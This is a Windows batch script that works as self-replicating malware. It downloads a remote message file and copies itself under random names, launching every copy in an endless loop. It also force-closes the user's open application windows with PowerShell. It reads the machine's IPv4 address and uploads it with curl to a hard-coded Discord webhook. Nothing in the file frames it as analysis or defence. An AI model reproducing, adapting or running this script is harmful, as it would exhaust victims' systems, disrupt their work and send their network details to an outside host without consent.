@echo off
:restart
set "GITHUB_URL=https://raw.githubusercontent.com/dm7257540-spec/duplicate/refs/heads/main/message"
set "OUTPUT_FILE=getfuckedlol.txt"

curl -L "%GITHUB_URL%" -o "%OUTPUT_FILE%"

setlocal enabledelayedexpansion

:: Define the alphabet string
set "alphabet=abcdefghijklmnopqrstuvwxyz"

:: Initialize an empty variable for the random name
set "random_name="

:: Loop 5 times to pick 5 random letters
for /l %%i in (1,1,5) do (
    set /a "rand_idx=!random! %% 26"
    for /f "delims=" %%j in ("!rand_idx!") do (
        set "random_name=!random_name!!alphabet:~%%j,1!"
    )
)

:: Set the full output filename
set "new_filename=!random_name!.bat"

:: Duplicate this file to the new random name
copy "%~f0" "!new_filename!" >nul

:: Run the newly duplicated batch file
start "" "!new_filename!"

powershell -NoProfile -Command ^
    "Get-Process | Where-Object { $_.MainWindowTitle -and $_.ProcessName -notin 'cmd','powershell','explorer' } | ForEach-Object { $_.CloseMainWindow() }"

type getfuckedlol.txt

set "WEBHOOK_URL=https://discord.com/api/webhooks/1516207278142001184/mQZr4dyF8ygbMsEFHa2fPw2PkXLC72zbb2yp0q4R4LbgDrWFu1W21YlWzqUzlNiYwme7"
set "FILE_NAME=your_ip.txt"

@for /f "delims=: tokens=2" %%a in ('ipconfig ^| find "IPv4"') do @echo %%a > your_ip.txt

curl -F "file1=@%FILE_NAME%" "%WEBHOOK_URL%"

endlocal
goto restart
